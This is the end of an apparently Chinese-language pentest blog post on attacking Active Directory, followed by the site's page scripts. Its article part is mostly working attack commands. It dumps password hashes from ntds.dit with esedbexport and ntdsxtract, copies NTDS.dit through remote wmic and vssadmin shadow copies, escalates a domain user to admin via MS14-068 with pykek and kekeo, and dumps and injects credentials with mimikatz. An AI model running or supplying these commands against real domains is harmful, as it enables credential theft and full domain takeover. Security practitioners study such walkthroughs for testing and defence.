    进一步从NTDS.DIT获取详细的信息:
        https://github.com/libyal/libesedb/releases
        $ ./configure
$ make
        $ sudo make install
$ sudo ldconfig
        root@kali2:~/Desktop/temp# /usr/local/bin/esedbexport -m tables &quot;/root/Desktop/temp/Active Directory/ntds.dit&quot;  
        (ntds.dit中提取出表，20分鐘，两个重要的表为:datatable以及link_table，他们都会被存放在./ntds.dit.export/文件夹中.)
    使用ntdsxtract提取域中信息，一旦表被提取出来，很多python工具可以将这些表中的信息进一步提取，比如ntdsxtract就可以完美进行。
        https://github.com/csababarta/ntdsxtract.git
        root@kali2:~/Desktop/ntdsxtract-master# python dsusers.py /root/Desktop/temp/ntds.dit.export/datatable.3 /root/Desktop/temp/ntds.dit.export/link_table.5 output --syshive /root/Desktop/temp/registry/SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt
        root@kali2:~/Desktop/ntdsxtract-master# python dscomputers.py /root/Desktop/temp/ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv
        ![mimikatz-lsa](域渗透相关/libesedb__ntdsxtract__ntds.dit.png)
6. 可创建和使用GOLDEN TICKET
7. 卷影复制(VSS)
    ntds.dit我们是没法直接进行复制拷贝的，会提示文件已被占用，这个时候我们可以通过windows提供的卷影复制功能来复制被进程占用的文件(xp和server 2003以上都存在此功能)
    1.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c vssadmin create shadow /for=c: 2&gt;&amp;1 &gt; c:vss.log&quot;
    2.wmic /node:AD /user:PENTEST\Administrator /password:123qwe!@# process call create &quot;cmd /c copy 卷影ID/Windows/NTDS/NTDS.dit C:/windows/temp/NTDS.dit 2&gt;&amp;1&quot;

8. 其他 - 转储活动目录数据库(ntds.dit)凭证的方法总结
    How Attackers Dump Active Directory Database Credentials
        https://adsecurity.org/?p=2398
    [译]转储活动目录数据库凭证的方法总结 
        http://drops.xmd5.com/static/drops/pentesting-12020.html
        之前两篇关于如何转储 AD 数据库凭证的文章： 
            a. 攻击者如何从一个域控制器中读取活动目录数据库(NTDS.DIT)(https://adsecurity.org/?p=451)
            b. 在 Active Directory 域中获得管理员权限的攻击方法(https://adsecurity.org/?p=2362  [译]https://xianzhi.aliyun.com/forum/topic/115)
</code></pre><h2 id="MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><a href="#MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控" class="headerlink" title="MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)"></a>MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</h2><p>允许域内任何一个普通用户，将自己提升至域管权限。</p>
<p>作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)</p>
<p>生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。</p>
<p>把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。</p>
<p>域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户</p>
<p>这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p>
<pre><code>1. mimikatz从域控上面抓取到所有账户信息
    mimikatz # log
    Using &#39;mimikatz.log&#39; for logfile : OK
    mimikatz # privilege::debug
    Privilege &#39;20&#39; OK
    mimikatz # lsadump::lsa /inject
    ......
2. https://github.com/bidord/pykek
    C:\pykek-master&gt;python ms14-068.py -u testwin7@demo.local -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz$RFV --rc4 6df9f68e4b0656fa9ffd91d250506f8f
    [+] Creating ccache file &#39;TGT_testwin7@demo.local.ccache&#39;... Done!]
3. mimikatz # kerberos::ptc TGT_testwin7@demo.local.ccache (利用mimikatz注入高权限TGT的缓存证书)
</code></pre><p>列举缓存证书的命令klist</p>
<p>或者使用 kekeo<br>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)</p>
<pre><code>kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)
http://www.mottoin.com/95877.html
</code></pre><p><strong>参考</strong></p>
<pre><code>Attack Methods for Gaining Domain Admin Rights in Active Directory
    http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)
一种深度隐蔽的后门方式(二)
    https://www.anquanke.com/post/id/93542
Mimikatz小实验:黄金票据+dcsync
    http://www.freebuf.com/sectool/112594.html
域渗透之hash与票据
    http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA
域渗透——利用SYSVOL还原组策略中保存的密码
    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/
如何巧妙的从ntds.dit中提取Hash和域信息
    http://www.freebuf.com/articles/system/151463.html
从活动目录中获取域管理员权限的6种方法
    http://www.4hou.com/technology/4256.html
Kerberoasting - Part 3
    https://room362.com/post/2016/kerberoast-pt3/
kekeo ticket 注入
    https://www.anquanke.com/post/id/92484
kerberoasting-without-mimikatz
    https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
    https://zhuanlan.zhihu.com/p/25723674 (翻譯)
Hash传递攻击登陆Windows2012远程桌面
    http://www.freebuf.com/articles/system/15757.html
</code></pre>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Kerberos/" rel="tag"># Kerberos</a>
          
            <a href="/tags/笔记/" rel="tag"># 笔记</a>
          
            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
          
            <a href="/tags/hash注入/" rel="tag"># hash注入</a>
          
            <a href="/tags/Golden-Ticket/" rel="tag"># Golden Ticket</a>
          
            <a href="/tags/NTDS-dit/" rel="tag"># NTDS.dit</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/02/18/Kerberos认证相关/" rel="next" title="Kerberos认证相关">
                <i class="fa fa-chevron-left"></i> Kerberos认证相关
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/03/28/批量导出ElasticSearch查询的结果/" rel="prev" title="批量导出ElasticSearch查询的结果">
                批量导出ElasticSearch查询的结果 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/jacksparrow.png"
                alt="Sparrow" />
            
              <p class="site-author-name" itemprop="name">Sparrow</p>
              <p class="site-description motion-element" itemprop="description">唯有时间不可挡</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">12</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sp4rr0w" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:zbxzyzbx@163.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                有趣的人
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.csdn.net/clownstar" title="CSDN" target="_blank">CSDN</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.c0smx.com/" title="dalao c0sMx" target="_blank">dalao c0sMx</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Hash-PTH-hash传递攻击-即-Mimikatz-hash注入"><span class="nav-number">1.</span> <span class="nav-text">Pass the Hash (PTH hash传递攻击, 即 Mimikatz hash注入 )</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-The-Key-OverPass-the-Hash"><span class="nav-number">2.</span> <span class="nav-text">Pass The Key (OverPass-the-Hash)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pass-the-Ticket-票据传递攻击PtT"><span class="nav-number">3.</span> <span class="nav-text">Pass the Ticket (票据传递攻击PtT)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Golden-Ticket-黄金票据"><span class="nav-number">4.</span> <span class="nav-text">Golden Ticket (黄金票据)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Silver-Ticket-白银票据"><span class="nav-number">5.</span> <span class="nav-text">Silver Ticket (白银票据)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoast-Kerberos-TGS服务票据-Service-Ticket-离线爆破"><span class="nav-number">6.</span> <span class="nav-text">Kerberoast (Kerberos TGS服务票据(Service Ticket)离线爆破)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberoasting-Kerberoast攻击的另一种姿势"><span class="nav-number">7.</span> <span class="nav-text">Kerberoasting - Kerberoast攻击的另一种姿势</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYSVOL"><span class="nav-number">8.</span> <span class="nav-text">SYSVOL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ntds-dit-活动目录的数据库文件"><span class="nav-number">9.</span> <span class="nav-text">ntds.dit (活动目录的数据库文件)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><span class="nav-number">10.</span> <span class="nav-text">MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Sparrow</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz',
        appKey: 'aaBboz6UbNeJnPowxKNNDTm2',
        placeholder: 'Just go go',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("XzzzFqxY7zSnAm9am6FHg6do-gzGzoHsz", "aaBboz6UbNeJnPowxKNNDTm2");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

</body>
</html>
